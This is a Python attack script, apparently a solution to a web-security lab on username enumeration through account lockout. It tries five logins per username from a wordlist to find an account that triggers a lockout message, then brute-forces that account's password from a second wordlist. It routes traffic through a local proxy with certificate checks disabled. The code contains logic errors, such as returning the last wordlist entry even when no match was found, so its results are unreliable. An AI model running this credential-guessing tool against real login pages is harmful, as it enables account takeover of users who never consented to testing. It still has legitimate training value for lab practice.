#Lab: Username enumeration via account lock
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

s=requests.Session()

def main():
    try:
        url=sys.argv[1].strip()
        usernames=sys.argv[2].strip()
        passwords=sys.argv[3].strip()
    except IndexError:
        print("[-] Missing Parameters usage python %s <url>"%sys.argv[0])
        sys.exit()
    print("[+] Enumerating Valid User :")
    valid_user=enum_users(s,url,usernames)
    if(valid_user):
        print("[+] Found valid Username : "+valid_user)
        print("[+] Enumerating Password : ")
        valid_pass=enum_password(s,url,valid_user,passwords)
    
    if(valid_pass):
        print("[+] Found valid password : "+str(valid_pass))
        if(valid_user and valid_pass):
            print("[+] Found Valid Credentials "+valid_user+" : "+valid_pass)
    
def enum_users(s,url,usernames):
    s.get(url,verify=False,proxies=proxies)
    
    try :
        with open(usernames) as users:
            for user in users:
                user=user.strip()
                
                for i in range(1,6):
                    data={'username':user,'password':'password'}
                    r=s.post(url+"login",proxies=proxies,verify=False,data=data)
                if 'too many' in r.text:
                    break
                
            return user
            
    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt,Quitting the Program")
        sys.exit()
    except TypeError:
        print('[+] Data Type concatenation mismatch')
        sys.exit()
    except :
        print("[-] Invalid Users file ")
        sys.exit(0)

def enum_password(s,url,valid_user,passwords):
    
    s.get(url,verify=False,proxies=proxies)
    
    try :
        
        with open(passwords) as password:
            for passwd in password:
                passwd=passwd.strip()
                data={'username':valid_user,'password':passwd}
                
                r=s.post(url+"login",proxies=proxies,verify=False,data=data,allow_redirects=False)
                
                
                if(int(r.status_code)==302):
                    break
            
            return passwd
    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt,Quitting the Program")
        sys.exit()
    except :
        print("[-] Invalid Users file ")
        sys.exit(0)
if __name__=='__main__':
    main()


